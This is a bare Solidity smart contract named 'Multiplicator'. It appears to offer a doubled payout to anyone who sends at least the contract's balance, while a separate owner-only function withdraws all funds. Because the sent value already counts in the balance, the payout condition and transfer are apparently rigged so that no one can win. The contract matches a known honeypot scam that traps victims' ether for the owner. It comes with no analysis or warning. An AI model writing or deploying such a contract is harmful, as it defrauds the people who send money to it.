pragma solidity ^0.4.18;

contract Multiplicator
{
    address public Owner = msg.sender;

    function()payable{}

    function b()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function a(address c)
    payable
    {
        if(msg.value>=this.balance)
        {
            c.transfer(this.balance+msg.value);
        }
    }
}